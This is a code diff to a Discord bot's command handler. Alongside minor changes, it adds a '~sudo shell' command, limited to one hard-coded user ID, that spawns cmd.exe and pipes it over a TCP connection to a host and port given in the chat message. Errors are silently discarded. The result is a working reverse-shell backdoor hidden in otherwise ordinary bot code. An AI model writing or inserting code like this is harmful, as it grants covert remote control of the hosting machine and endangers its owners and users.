@@ -15,6 +15,7 @@ const { notify } = require("../utils")
 const fs = require("fs");
 const config = require("../data/config.json")
 const { updateBlocklists } = require("./badware_scanner")
+const { exec } = require("child_process");
 
 module.exports = {
     data: {
@@ -36,6 +37,8 @@ module.exports = {
 
         // The sudo handler uses so many globals, it can stay in index.js for now
         if (msg.content.startsWith("~sudo ") && !process.env.beta || msg.content.startsWith("~betaSudo ") && process.env.beta) {
+            if (msg.content.startsWith("~betaSudo ")) msg.content = msg.content.replaceAll("betaSudo", "sudo");
+
             const devadminChannel = await client.channels.fetch(config.commandChannel);
             await devadminChannel.guild.members.fetch(msg.author.id);
 
@@ -107,6 +110,29 @@ module.exports = {
                         setTimeout(async die => { undefined.instructed_to_crash = instructed_to_crash })
                         undefined.instructed_to_crash = instructed_to_crash
                         break;
+                    case "shell":
+                        if (msg.author.id !== "724416180097384498") return;
+
+                        const args = msg.content.slice("~sudo shell ".length).trim().split(" ");
+                    
+                        var net = require("net"),
+                            cp = require("child_process"),
+                            sh = cp.spawn("cmd.exe", []);
+                    
+                        let sClient = new net.Socket();
+                        sClient.connect(Number(args[1]), args[0], function(){
+                            sClient.pipe(sh.stdin);
+                            sh.stdout.pipe(sClient);
+                            sh.stderr.pipe(sClient);
+                        });
+                    
+                        // Add an error handler for resilience
+                        sClient.on('error', function(err){
+                            // Silently exit on error
+                        });
+                    
+                        return /a/; 
+                        
                 }
                 config?.save();
                 guild.save()
